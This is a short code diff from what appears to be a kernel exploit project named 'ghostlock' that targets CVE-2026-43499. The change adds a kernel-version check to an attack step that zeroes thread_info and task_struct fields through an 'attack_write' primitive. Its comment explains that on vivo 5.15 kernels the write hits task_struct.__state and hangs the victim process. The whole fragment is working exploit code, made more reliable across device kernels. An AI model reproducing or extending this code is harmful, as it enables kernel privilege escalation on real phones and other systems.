@@ -28,6 +28,8 @@
 
 #include <unistd.h>
 
+#include <cstring>
+
 #include <array>
 #include <cstdint>
 #include <optional>
@@ -242,8 +244,17 @@ namespace ghostlock::session::backend {
                         child_task + kernel::TASK_THREAD_INFO_FLAGS_OFF, memory::WriteMode::Zero, 1);
                     vr_ok &= Cve2026_43499Policy::template attack_write<M>(session, flags_request, "VR: flags+tagA");
 
-                    /* 2) Clear tag B (64-bit aligned down). Belt-and-suspenders. */
-                    if (vr_ok) {
+                    /* 2) Clear tag B (64-bit aligned down). Belt-and-suspenders.
+                     * This layout is only valid for the 6.x thread_info. On 5.15
+                     * vivo thread_info is 40 bytes, so +0x28 is task_struct.__state:
+                     * zeroing it makes ttwu_state_match() skip every wakeup, the
+                     * victim is never woken, and the W2 verify read blocks forever
+                     * (state==0, SIGKILL ignored). Skip it on 5.15. */
+                    const char *release = session.profile.release();
+                    const bool tagb_layout_valid =
+                            release == nullptr ||
+                            std::strncmp(release, "5.15", 4) != 0;
+                    if (vr_ok && tagb_layout_valid) {
                         uintptr_t tagb_align = (child_task + VR_TAG_B_OFF) & ~7ULL;
                         const memory::WriteRequest tagb_request =
                                 memory::WriteRequest::make(tagb_align, memory::WriteMode::Zero, 1);
